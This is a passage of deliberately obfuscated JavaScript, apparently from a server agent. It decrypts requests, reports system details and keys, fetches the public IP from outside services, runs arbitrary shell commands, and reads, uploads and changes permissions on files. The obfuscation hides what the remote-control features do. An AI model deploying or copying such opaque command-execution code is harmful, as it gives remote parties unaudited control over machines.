            const s = c[bs(0x1e3)]((d['headers'][c[bs(0x275)]] || '')[bs(0x207)](), c['DeqnY']);
            try {
                if (s && d[bs(0x641)]) {
                    const t = Buffer[bs(0x45b)](a0O['SESSION_KEY'], c[bs(0x409)]), u = a['decryptData'](d['body'], t);
                    d[bs(0x554)] = JSON[bs(0x4d7)](u);
                } else {
                    if (d[bs(0x554)][bs(0x86b)](c[bs(0x752)])) {
                        const v = Buffer[bs(0x45b)](d[bs(0x554)], c[bs(0x409)])[bs(0x3e8)](c[bs(0x72f)]);
                        d[bs(0x554)] = JSON[bs(0x4d7)](v);
                    } else {
                        if (d[bs(0x554)][bs(0x777)]()[bs(0x86b)]('{') || d[bs(0x554)][bs(0x777)]()[bs(0x86b)]('['))
                            d['body'] = JSON[bs(0x4d7)](d[bs(0x554)]);
                        else {
                            if (c[bs(0x6de)](d['body'][bs(0x777)](), ''))
                                d[bs(0x554)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0C[bs(0x484)]('💥\x20[Body\x20Parse\x20Error]:\x20' + w['message']), f[bs(0x765)](0x190)[bs(0x1d5)]({ 'error': 'Invalid\x20body\x20format:\x20' + w[bs(0x346)] });
            }
        }
        const m = f[bs(0x796)];
        f['send'] = function (x) {
            const bt = bs;
            if (f[bt(0x52b)](bt(0x774)) && f['get'](h[bt(0x3e4)])[bt(0x50f)](h['JKfJs']))
                try {
                    const y = h[bt(0x24f)](typeof x, bt(0x63e)) ? JSON[bt(0x4d7)](x) : x;
                    if (d['is_authenticated']) {
                        let z = null;
                        h[bt(0x24f)](d['key_source'], h[bt(0x2c3)]) && b && (z = b['getActiveEciesPub']());
                        const A = a[bt(0x460)](y, z), B = h['tdPLU'](typeof A, h['dbWpp']) ? A : JSON[bt(0x656)](A);
                        return f[bt(0x3f0)](h[bt(0x1f3)], h[bt(0x525)]), f['set']('x-agent-version', a0O[bt(0x3b7)]), f['set'](h['iGxzy'], Buffer[bt(0x352)](B, h[bt(0x3c2)])['toString']()), m[bt(0x5fe)](this, B);
                    } else {
                        const C = h[bt(0x24f)](typeof x, h[bt(0x204)]) ? x : JSON[bt(0x656)](y);
                        return f['set'](h[bt(0x1f3)], h[bt(0x262)]), f[bt(0x3f0)](bt(0x24a), Buffer['byteLength'](C, h[bt(0x3c2)])[bt(0x3e8)]()), m[bt(0x5fe)](this, C);
                    }
                } catch (D) {
                    if (a0O[bt(0x590)])
                        a0C[bt(0x484)](bt(0x827) + D[bt(0x346)]);
                }
            return m[bt(0x5fe)](this, x);
        }, c[bs(0x312)](g);
    };
}
class a0T {
    constructor() {
        const bu = a0aQ;
        this[bu(0x386)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bu(0x4ae)] = 0x0, this[bu(0x67c)] = 0x0, this[bu(0x3db)] = Date[bu(0x86c)]() / 0x3e8;
    }
    async ['getContainerMemory']() {
        const bv = a0aQ, a = {
                'bfzKF': bv(0x1f4),
                'yABgk': bv(0x592),
                'FNXYW': 'max',
                'MwXYf': function (d, f, g) {
                    return d(f, g);
                },
                'ncLdl': '/sys/fs/cgroup/memory.current',
                'shRYn': bv(0x4e4),
                'FoGlj': bv(0x731),
                'CSdrG': function (d, f) {
                    return d === f;
                },
                'SHJbB': function (d, f) {
                    return d(f);
                },
                'ZwzHe': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bv(0x617)](a['bfzKF'], a[bv(0x6ba)]))['trim']();
            b = d === a[bv(0x457)] ? null : parseInt(d, 0xa), c = a[bv(0x36b)](parseInt, (await a0m['readFile'](a[bv(0x5ff)], a[bv(0x6ba)]))[bv(0x777)](), 0xa);
        } catch {
            try {
                b = parseInt((await a0m['readFile'](a[bv(0x564)], a['yABgk']))['trim'](), 0xa), c = parseInt((await a0m['readFile'](a[bv(0x685)], a[bv(0x6ba)]))[bv(0x777)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0t[bv(0x7c6)]();
                b = f[bv(0x83b)], c = f['used'];
            }
        }
        if (a[bv(0x637)](b, null)) {
            const g = await a0t[bv(0x7c6)]();
            b = g[bv(0x83b)], (a['CSdrG'](c, null) || a[bv(0x837)](isNaN, c)) && (c = g[bv(0x84b)]);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': a[bv(0x3d4)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aQ(0x7ae)]() {
        const bw = a0aQ, [a, b, c, d] = await Promise[bw(0x3ba)]([
                a0t[bw(0x4a3)](),
                this[bw(0x64e)](),
                a0t['osInfo'](),
                a0t['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[bw(0x3ba)]([
                this[bw(0x1f8)](),
                this[bw(0x816)]()
            ]);
        } catch (h) {
            a0C['debug'](bw(0x4e8) + h[bw(0x346)], 0x1);
        }
        return {
            'arch': a0o[bw(0x61c)](),
            'cpu_cores': a['cores'],
            'cpu_name': a[bw(0x4f7)],
            'disk_total': (await a0t[bw(0x805)]())[0x0]?.[bw(0x40c)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bw(0x83b)],
            'os': c[bw(0x6b5)] + '\x20' + c['release'],
            'kernel_version': c[bw(0x410)],
            'swap_total': b['swaptotal'],
            'version': a0O[bw(0x3b7)],
            'virtualization': await this['_getVirtualization'](),
            'session_key': a0O[bw(0x2f9)],
            'noise_key': a0O[bw(0x38e)]
        };
    }
    ['getLocalIPv4']() {
        const bx = a0aQ, a = {
                'alJSK': function (c, d) {
                    return c === d;
                },
                'qqAnf': bx(0x60c)
            }, b = a0o['networkInterfaces']();
        for (const c of Object[bx(0x38a)](b)) {
            for (const d of b[c]) {
                const f = a[bx(0x896)](d['family'], a['qqAnf']) || a[bx(0x896)](d['family'], 0x4);
                if (f && !d[bx(0x814)]) {
                    if (!/^10\./[bx(0x5b3)](d[bx(0x32a)]) && !/^192\.168\./[bx(0x5b3)](d[bx(0x32a)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d['address']))
                        return d[bx(0x32a)];
                }
            }
        }
        return null;
    }
    async [a0aQ(0x1f8)]() {
        const by = a0aQ, a = {
                'Hrsao': by(0x2d2),
                'LQaEl': by(0x6a3),
                'QRrfZ': by(0x7ef),
                'oWQrG': by(0x3c0),
                'VQNbR': 'https://ipecho.net/plain',
                'vPakI': by(0x620)
            }, b = [
                a[by(0x2cd)],
                a[by(0x2d7)],
                a[by(0x1c8)],
                a['oWQrG'],
                a[by(0x337)],
                a[by(0x84a)],
                by(0x7c5)
            ];
        for (const d of b) {
            try {
                const f = await this['fetchIP'](d, 0x4);
                if (f && this[by(0x4c2)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[by(0x4fc)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    [a0aQ(0x699)]() {
        const bz = a0aQ, a = {
                'aqwfB': function (c, d) {
                    return c === d;
                },
                'bwlOn': bz(0x44b)
            }, b = a0o[bz(0x1fd)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[bz(0x75c)](d[bz(0x3c4)], bz(0x575)) || a[bz(0x75c)](d['family'], 0x6);
                if (f && !d[bz(0x814)]) {
                    if (!d[bz(0x32a)][bz(0x207)]()[bz(0x86b)](a[bz(0x7ce)]))
                        return d[bz(0x32a)];
                }
            }
        }
        return null;
    }
    async [a0aQ(0x816)]() {
        const bA = a0aQ, a = {
                'ZTBJo': bA(0x755),
                'QNpmO': 'https://icanhazip.com',
                'HGUrv': bA(0x7c8)
            }, b = this[bA(0x699)]();
        if (b && this[bA(0x2ef)](b))
            return b;
        const c = [
            a[bA(0x33b)],
            a['QNpmO'],
            a[bA(0x500)]
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this[bA(0x2ef)](f))
                    return f;
            } catch (g) {
                a0C[bA(0x4b3)](bA(0x67e) + d + bA(0x5ec) + g['message']);
                continue;
            }
        }
        return null;
    }
    async ['fetchIP'](a, b = 0x0) {
        const bB = a0aQ, c = {
                'gmljQ': function (d, f) {
                    return d !== f;
                },
                'CrOAn': function (d, f) {
                    return d(f);
                },
                'wrpDv': 'data',
                'KfNRJ': 'end',
                'Isnwn': bB(0x6ec),
                'GTrdO': function (d, f) {
                    return d(f);
                },
                'xhdGD': bB(0x276),
                'cZlMQ': bB(0x484)
            };
        return new Promise((d, f) => {
            const bC = bB, g = c[bC(0x846)](require, 'https'), h = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[bC(0x56e)] }
                }, i = g[bC(0x52b)](a, h, j => {
                    const bD = bC;
                    let k = '';
                    if (c['gmljQ'](j[bD(0x329)], 0xc8)) {
                        c[bD(0x579)](f, new Error(bD(0x613) + j[bD(0x329)]));
                        return;
                    }
                    j['on'](c[bD(0x595)], l => k += l), j['on'](c[bD(0x45c)], () => d(k['trim']()));
                });
            i['on'](c[bC(0x360)], f), i[bC(0x1e4)](0x1388, () => {
                const bE = bC;
                i[bE(0x79b)](), c['CrOAn'](f, new Error(c[bE(0x377)]));
            });
        });
    }
    [a0aQ(0x4c2)](a) {
        const bF = a0aQ;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bF(0x5b3)](a);
    }
    ['isValidIPv6'](a) {
        const bG = a0aQ;
        if (!/^[0-9a-fA-F:]+$/['test'](a) || !a[bG(0x50f)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bG(0x5b3)](a))
            return ![];
        return !![];
    }
    async [a0aQ(0x6ae)]() {
        const bH = a0aQ, a = {
                'HFeaU': function (m, n) {
                    return m / n;
                },
                'zDLwf': function (m, n) {
                    return m - n;
                },
                'qgXpg': function (m, n) {
                    return m - n;
                },
                'LBzeR': function (m, n) {
                    return m - n;
                },
                'LSjlc': function (m, n) {
                    return m * n;
                },
                'shDYv': function (m, n) {
                    return m / n;
                },
                'EciCE': function (m, n) {
                    return m * n;
                },
                'pfVWS': function (m, n) {
                    return m / n;
                },
                'UjgEy': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bH(0x3ba)]([
                a0t[bH(0x549)](),
                a0t[bH(0x7c6)](),
                a0t['networkStats'](),
                a0t[bH(0x549)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bH(0x47f)](Date[bH(0x86c)](), 0x3e8), i = a[bH(0x836)](h, this[bH(0x3db)]), j = a[bH(0x5bc)](g['tx_bytes'], this[bH(0x386)]['tx']), k = a[bH(0x28c)](g[bH(0x53f)], this[bH(0x386)]['rx']);
        this[bH(0x4ae)] += j, this[bH(0x67c)] += k, this[bH(0x386)] = {
            'tx': g['tx_bytes'],
            'rx': g[bH(0x53f)]
        }, this[bH(0x3db)] = h;
        const l = await a0t[bH(0x7a3)]();
        return {
            'cpu': { 'usage': Math['round'](b[bH(0x549)]) },
            'ram': {
                'total': c[bH(0x83b)],
                'used': c[bH(0x364)]
            },
            'swap': {
                'total': c[bH(0x334)],
                'used': c[bH(0x3ab)]
            },
            'load': {
                'load1': a[bH(0x47f)](Math[bH(0x1d1)](a[bH(0x4d2)](f[bH(0x1ef)], 0x64)), 0x64),
                'load5': a['HFeaU'](Math[bH(0x1d1)](f[bH(0x1ef)] * 0x64), 0x64),
                'load15': a[bH(0x635)](Math[bH(0x1d1)](a['EciCE'](f[bH(0x1ef)], 0x64)), 0x64)
            },
            'disk': await this[bH(0x35e)](),
            'network': {
                'up': Math[bH(0x1d1)](a[bH(0x3fe)](j, i)),
                'down': Math[bH(0x1d1)](a[bH(0x67d)](k, i)),
                'totalUp': this[bH(0x4ae)],
                'totalDown': this[bH(0x67c)]
            },
            'connections': await this[bH(0x7c2)](),
            'uptime': a0o[bH(0x434)](),
            'process': l?.[bH(0x3ba)] || 0x0,
            'message': ''
        };
    }
    async [a0aQ(0x623)]() {
        const bI = a0aQ, a = {
                'dSeCz': '/.dockerenv',
                'OiBlX': bI(0x365),
                'dvApy': bI(0x41d),
                'tVAZH': bI(0x5b0),
                'GNxhX': bI(0x592),
                'wrhbN': bI(0x869),
                'NOjjU': bI(0x551),
                'TbJKB': 'Docker',
                'lRGOP': bI(0x5d9),
                'fwyvh': bI(0x38c),
                'pJmcb': 'lxc',
                'bzZmj': bI(0x27f),
                'Beimj': bI(0x452),
                'Tzpry': '/pods/',
                'giACM': 'kubelet',
                'QbpcD': '/proc/1/environ',
                'BEgxL': bI(0x26f),
                'FZRMX': bI(0x35f),
                'OFjfs': bI(0x553)
            };
        try {
            if (a0l['existsSync'](a[bI(0x4ff)]))
                return bI(0x4d6);
            if (a0l['existsSync'](a['OiBlX']))
                return a[bI(0x826)];
            if (a0l[bI(0x235)](a['tVAZH'])) {
                const b = a0l[bI(0x778)](a['tVAZH'], a[bI(0x60f)])[bI(0x207)]();
                if (b[bI(0x50f)](a['wrhbN']) || b[bI(0x50f)](a[bI(0x4bc)]))
                    return a[bI(0x5df)];
                else {
                    if (b['includes'](a['lRGOP']))
                        return a[bI(0x7c1)];
                    else {
                        if (b[bI(0x50f)](a[bI(0x663)]))
                            return a[bI(0x557)];
                    }
                }
            }
            if (a0l[bI(0x235)](a[bI(0x516)])) {
                const c = a0l[bI(0x778)](a[bI(0x516)], bI(0x592));
                if (c['includes'](bI(0x64d)) || c[bI(0x50f)](bI(0x658)))
                    return a[bI(0x5df)];
                else {
                    if (c['includes'](a[bI(0x850)]) || c['includes'](a['giACM']))
                        return bI(0x38c);
                }
            }
            if (a0l['existsSync'](a['QbpcD'])) {
                const d = a0l[bI(0x778)](a['QbpcD'], a['GNxhX']);
                if (d['includes'](bI(0x395)))
                    return a[bI(0x557)];
            }
            if (a0l[bI(0x235)](a['BEgxL'])) {
                const f = a0l[bI(0x778)](bI(0x26f), a[bI(0x60f)]);
                if (f[bI(0x50f)](a['FZRMX']) || f['includes'](a['OFjfs']))
                    return a['FZRMX'];
            }
        } catch (g) {
        }
        return bI(0x1c6);
    }
    async [a0aQ(0x35e)]() {
        const bJ = a0aQ, a = {
                'FNzIh': function (b, c) {
                    return b !== c;
                },
                'hsQwt': bJ(0x442),
                'VxPpo': '/dev/'
            };
        try {
            const b = await a0t['fsSize'](), c = b[bJ(0x4c7)](g => {
                    const bK = bJ;
                    return g['size'] > 0x0 && a[bK(0x309)](g[bK(0x53a)], a[bK(0x810)]) && a[bK(0x309)](g[bK(0x53a)], bK(0x6a2)) && g['fs'][bK(0x86b)](a[bK(0x492)]);
                }), d = c[bJ(0x61f)]((g, h) => g + h[bJ(0x40c)], 0x0), f = c[bJ(0x61f)]((g, h) => g + h[bJ(0x84b)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aQ(0x7c2)]() {
        const bL = a0aQ;
        try {
            const a = await a0t[bL(0x818)](), b = a[bL(0x4c7)](d => d[bL(0x27c)] === bL(0x4eb))['length'], c = a['filter'](d => d[bL(0x27c)] === bL(0x245))['length'];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0U {
    static async [a0aQ(0x88b)](a, b = {}) {
        const bM = a0aQ, c = {
                'QQjcH': function (d, f) {
                    return d - f;
                },
                'WpXrh': function (d, f) {
                    return d || f;
                },
                'vFyFx': bM(0x40f),
                'jSyFX': function (d, f) {
                    return d(f);
                },
                'XJpet': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'vKATr': function (d, f) {
                    return d * f;
                },
                'tsKeM': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process['cwd'](),
                env: env = {},
                timeout: timeout = a0O[bM(0x7df)]
            } = b;
        return new Promise(d => {
            const bO = bM, f = {
                    'SOFLI': function (i, j) {
                        return c['QQjcH'](i, j);
                    },
                    'IRXJQ': function (i, j) {
                        const bN = a0b;
                        return c[bN(0x218)](i, j);
                    },
                    'WwCrD': function (i, j) {
                        return i === j;
                    },
                    'GuCzt': c[bO(0x86d)],
                    'tdafV': function (i, j) {
                        const bP = bO;
                        return c[bP(0x363)](i, j);
                    }
                }, g = Date[bO(0x86c)](), h = c[bO(0x31f)](a0q, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[bO(0x272)](timeout, 0x3e8),
                    'maxBuffer': c['vKATr'](c[bO(0x602)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const bQ = bO, l = f[bQ(0x474)](Date['now'](), g), m = i && i[bQ(0x432)] && i[bQ(0x52c)];
                    let n = f[bQ(0x754)](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[bQ(0x6f6)](typeof i[bQ(0x5ca)], f[bQ(0x234)]) ? o = i[bQ(0x5ca)] : o = -0x1;
                    }
                    f[bQ(0x55c)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
function a0V(a) {
    const bR = a0aQ, b = {
            'bGCxG': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[bR(0x687)]['native'](a0n[bR(0x26a)](a0O[bR(0x447)])), d = a0n[bR(0x26a)](a);
        let f = d;
        while (!a0l[bR(0x235)](f)) {
            const j = a0n[bR(0x7c9)](f);
            if (b[bR(0x1e0)](j, f))
                return ![];
            f = j;
        }
        const g = a0l['realpathSync'][bR(0x728)](f), h = a0n[bR(0x4b9)](c, g);
        if (h['startsWith']('..') || a0n[bR(0x462)](h))
            return ![];
        const i = a0n[bR(0x4b9)](f, d);
        if (i && (i['startsWith']('..') || a0n[bR(0x462)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0W {
    static async [a0aQ(0x307)](a, b = ![]) {
        const bS = a0aQ, c = {
                'WtNCo': bS(0x603),
                'KAxGo': 'file',
                'hulAQ': function (h, i) {
                    return h & i;
                },
                'RKUhG': function (h, i) {
                    return h(i);
                },
                'WtyXy': function (h, i) {
                    return h || i;
                },
                'uGUcw': bS(0x7bb),
                'IrNnz': function (h, i) {
                    return h(i);
                }
            }, d = a0n[bS(0x26a)](a0O[bS(0x447)], c[bS(0x7cf)](a, '.'));
        if (!c[bS(0x3f4)](a0V, d))
            throw new Error(c['uGUcw']);
        if (!a0l['existsSync'](d))
            throw new Error(bS(0x2f8));
        const f = [], g = h => {
                const bT = bS, i = a0l[bT(0x48f)](h);
                for (const j of i) {
                    const k = a0n[bT(0x48d)](h, j), l = a0l[bT(0x1ce)](k), m = new a0K();
                    m[bT(0x842)] = j, m[bT(0x793)] = a0n[bT(0x4b9)](a0O[bT(0x447)], k), m[bT(0x53a)] = l[bT(0x41b)]() ? c[bT(0x446)] : c[bT(0x51f)], m[bT(0x40c)] = l[bT(0x40c)], m[bT(0x469)] = l[bT(0x469)][bT(0x860)](), m[bT(0x748)] = this[bT(0x659)](l[bT(0x748)], l['isDirectory']()), m[bT(0x7b8)] = '0o' + c['hulAQ'](l[bT(0x748)], 0x1ff)[bT(0x3e8)](0x8), m[bT(0x324)] = l['uid'] + ':' + l[bT(0x677)], f[bT(0x381)](m), b && l[bT(0x41b)]() && c[bT(0x3f4)](g, k);
                }
            };
        return c[bS(0x840)](g, d), f;
    }
    static async [a0aQ(0x3bd)](a) {
        const bU = a0aQ, b = {
                'OqTVY': function (d, f) {
                    return d(f);
                },
                'GAztp': bU(0x488)
            }, c = [];
        for (const d of a) {
            const f = a0n['resolve'](a0O['FILE_ROOT'], d);
            if (!b[bU(0x252)](a0V, f))
                continue;
            try {
                const g = a0l[bU(0x1ce)](f), h = this[bU(0x5e4)](f, a0l['constants']['R_OK']), i = this[bU(0x5e4)](f, a0l[bU(0x62c)][bU(0x46e)]), j = this['_checkAccess'](f, a0l[bU(0x62c)][bU(0x31c)]), k = new a0L();
                k[bU(0x793)] = a0n[bU(0x4b9)](a0O[bU(0x447)], f), k['name'] = a0n[bU(0x85d)](f), k[bU(0x748)] = this['_formatMode'](g[bU(0x748)], g[bU(0x41b)]()), k[bU(0x7b8)] = '0o' + (g[bU(0x748)] & 0x1ff)[bU(0x3e8)](0x8), k[bU(0x53a)] = g['isDirectory']() ? 'directory' : b[bU(0x2e2)], k['readable'] = h, k[bU(0x781)] = i, k[bU(0x4ab)] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static ['_checkAccess'](a, b) {
        try {
            return a0l['accessSync'](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aQ(0x408)](a) {
        const bV = a0aQ, b = {
                'cexXs': function (c, d) {
                    return c === d;
                },
                'BHidh': bV(0x40f),
                'ikdWl': function (c, d) {
                    return c === d;
                },
                'SmlKG': 'Unsupported\x20permission\x20format,\x20only\x20octal\x20strings\x20are\x20supported'
            };
        if (b[bV(0x30f)](typeof a, b[bV(0x7d4)]))
            return a;
        if (b[bV(0x6f1)](typeof a, bV(0x63e))) {
            const c = a[bV(0x777)]();
            if (/^[0-7]{3,4}$/['test'](c))
                return parseInt(c, 0x8);
        }
        throw new Error(b[bV(0x708)]);
    }
    static ['_formatMode'](a, b) {
        const bW = a0aQ, c = {
                'JfwuJ': function (i, j) {
                    return i & j;
                },
                'AqeXY': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c['JfwuJ'](a, 0x1ff)[bW(0x3e8)](0x8)[bW(0x705)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[bW(0x288)](parseInt, i, 0xa);
            h += f[bW(0x3dc)]((k, l) => j & 0x4 >> l ? k : '-')[bW(0x48d)]('');
        }
        return h;
    }
    static async [a0aQ(0x76f)](a, b = ![]) {
        const bX = a0aQ, c = {
                'nhxgZ': function (g, h) {
                    return g(h);
                },
                'hBWVd': function (g, h) {
                    return g(h);
                },
                'BmRNS': function (g, h) {
                    return g(h);
                },
                'vDXLZ': function (g, h) {
                    return g(h);
                },
                'dZatn': 'access_denied',
                'pKdKx': function (g, h) {
                    return g(h);
                },
                'cFWrr': bX(0x484)
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0n['resolve'](a0O[bX(0x447)], g);
            if (!c['BmRNS'](a0V, i)) {
                d['push']({
                    'path': g,
                    'requested': c[bX(0x653)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['dZatn']
                });
                continue;
            }
            try {
                const j = this[bX(0x408)](h), k = m => {
                        const bY = bX;
                        a0l[bY(0x42a)](m, j);
                    };
                if (b && a0l[bX(0x235)](i) && a0l[bX(0x1ce)](i)[bX(0x41b)]()) {
                    const m = n => {
                        const bZ = bX;
                        c[bZ(0x24d)](k, n);
                        const o = a0l[bZ(0x48f)](n);
                        for (const p of o) {
                            const q = a0n[bZ(0x48d)](n, p);
                            a0l[bZ(0x1ce)](q)['isDirectory']() ? c[bZ(0x701)](m, q) : c['hBWVd'](k, q);
                        }
                    };
                    c[bX(0x653)](m, i);
                } else
                    c[bX(0x24d)](k, i);
                const l = j[bX(0x3e8)](0x8);
                d['push']({
                    'path': g,
                    'requested': c[bX(0x7be)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[bX(0x381)]({
                    'path': g,
                    'requested': c[bX(0x811)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[bX(0x7a2)],
                    'message': n['message']
                });
            }
        }
        const f = d[bX(0x4c7)](o => o[bX(0x765)] === 'ok')[bX(0x32c)];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0aQ(0x617)](a) {
        const c0 = a0aQ, b = {
                'rANPT': 'Access\x20denied:\x20path\x20outside\x20root',
                'nRlMM': function (h, i) {
                    return h > i;
                },
                'WrSbQ': function (h, i) {
                    return h * i;
                },
                'vTvhx': c0(0x427),
                'dvSaJ': c0(0x592),
                'ILQVa': 'base64',
                'EBSOJ': c0(0x3fb)
            }, c = a0n['resolve'](a0O[c0(0x447)], a);
        if (!a0V(c))
            throw new Error(b[c0(0x24b)]);
        const d = a0l[c0(0x1ce)](c);
        if (b[c0(0x398)](d[c0(0x40c)], b[c0(0x26b)](0x400, 0x400)))
            throw new Error(b['vTvhx']);
        const f = a0l['readFileSync'](c), g = this[c0(0x376)](f);
        return {
            'status': 'ok',
            'path': a0n[c0(0x4b9)](a0O[c0(0x447)], c),
            'content': g ? a0v[c0(0x645)](f) : f['toString'](b[c0(0x47d)]),
            'encoding': g ? b[c0(0x841)] : b[c0(0x6d7)],
            'is_binary': g,
            'size': d['size']
        };
    }
    static [a0aQ(0x376)](a) {
        const c1 = a0aQ, b = {
                'kbVdD': function (c, d) {
                    return c === d;
                },
                'tIlAO': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b[c1(0x4a9)](a[c1(0x32c)], 0x0))
            return ![];
        for (let c = 0x0; b[c1(0x437)](c, Math['min'](a[c1(0x32c)], 0x200)); c++) {
            if (b['kbVdD'](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0aQ(0x39e)](a, b, c, d = null, f = null) {
        const c2 = a0aQ, g = {
                'qwxpB': function (l, m) {
                    return l(m);
                },
                'DvcIU': c2(0x7bb),
                'BWlxQ': function (l, m) {
                    return l > m;
                },
                'DOehq': c2(0x427),
                'fSRGO': function (l, m) {
                    return l !== m;
                },
                'ufGVA': function (l, m) {
                    return l(m);
                },
                'hhXhI': function (l, m) {
                    return l(m);
                },
                'aEWqa': 'chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric',
                'JFbVt': c2(0x1db),
                'zrlJW': function (l, m) {
                    return l === m;
                },
                'coUwX': function (l, m) {
                    return l < m;
                }
            }, h = a0n[c2(0x26a)](a0O[c2(0x447)], a);
        let j = h;
        b && (j = a0n[c2(0x48d)](h, b));
        if (!g[c2(0x2c2)](a0V, j))
            throw new Error(g[c2(0x2e0)]);
        !a0l[c2(0x235)](a0n[c2(0x7c9)](j)) && a0l[c2(0x354)](a0n[c2(0x7c9)](j), { 'recursive': !![] });
        const k = a0v[c2(0x5d2)](c);
        if (g[c2(0x53b)](k['length'], a0O[c2(0x714)]))
            throw new Error(g[c2(0x880)]);
        if (d !== null && g[c2(0x55b)](f, null)) {
            const l = g[c2(0x666)](Number, d), m = g[c2(0x4da)](Number, f);
            if (Number[c2(0x697)](l) || Number[c2(0x697)](m))
                throw new Error(g[c2(0x57a)]);
            const n = a0n[c2(0x48d)](a0n[c2(0x7c9)](j), g[c2(0x870)], a0n[c2(0x85d)](j));
            !a0l[c2(0x235)](n) && a0l[c2(0x354)](n, { 'recursive': !![] });
            const o = a0n['join'](n, c2(0x7ee) + l);
            a0l['writeFileSync'](o, k);
            const p = a0l[c2(0x48f)](n)['filter'](s => s[c2(0x86b)](c2(0x7ee))), q = p[c2(0x32c)], r = g[c2(0x739)](q, m);
            if (r) {
                const s = a0l[c2(0x682)](j);
                for (let u = 0x0; g[c2(0x5db)](u, m); u++) {
                    const v = a0n['join'](n, c2(0x7ee) + u);
                    if (!a0l[c2(0x235)](v)) {
                        s[c2(0x6af)]();
                        throw new Error(c2(0x5a8) + u);
                    }
                    s['write'](a0l[c2(0x778)](v));
                }
                s[c2(0x4ef)]();
                const t = a0n[c2(0x7c9)](n);
                a0l['rmSync'](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[c2(0x582)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0n['relative'](a0O[c2(0x447)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l['writeFileSync'](j, k), {
            'status': 'ok',
            'path': a0n[c2(0x4b9)](a0O['FILE_ROOT'], j),
            'received': k['length'],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const c3 = a0aQ, g = {
                'wtGjL': function (k, l) {
                    return k(l);
                },
                'ltsqv': function (k, l) {
                    return k > l;
                },
                'cioHg': c3(0x427),
                'SzuUu': c3(0x6b4),
                'KXRns': c3(0x1db),
                'hKoax': function (k, l) {
                    return k < l;
                },
                'TfLzr': c3(0x68e)
            }, h = a0n['resolve'](a0O['FILE_ROOT'], a || '.');
        let j = h;
        b && (j = a0n[c3(0x48d)](h, b));
        if (!g['wtGjL'](a0V, j))
            throw new Error(c3(0x7bb));
        !a0l[c3(0x235)](a0n[c3(0x7c9)](j)) && a0l[c3(0x354)](a0n[c3(0x7c9)](j), { 'recursive': !![] });
        if (g[c3(0x439)](c[c3(0x32c)], a0O[c3(0x714)]))
            throw new Error(g['cioHg']);
        if (d !== null && f !== null) {
            const k = g['wtGjL'](Number, d), l = Number(f);
            if (Number['isNaN'](k) || Number[c3(0x697)](l))
                throw new Error(g[c3(0x767)]);
            const m = a0n['join'](a0n[c3(0x7c9)](j), g[c3(0x3cd)], a0n[c3(0x85d)](j));
            !a0l[c3(0x235)](m) && a0l[c3(0x354)](m, { 'recursive': !![] });
            const n = a0n[c3(0x48d)](m, 'chunk_' + k);
            a0l['writeFileSync'](n, c);
            const o = a0l['readdirSync'](m)[c3(0x4c7)](r => r['startsWith'](c3(0x7ee))), p = o[c3(0x32c)], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g['hKoax'](t, l); t++) {
                    const u = a0n[c3(0x48d)](m, c3(0x7ee) + t);
                    if (!a0l['existsSync'](u))
                        throw new Error(c3(0x5a8) + t);
                    r[c3(0x381)](a0l[c3(0x778)](u));
                }
                a0l['writeFileSync'](j, Buffer['concat'](r));
                const s = a0n[c3(0x7c9)](m);
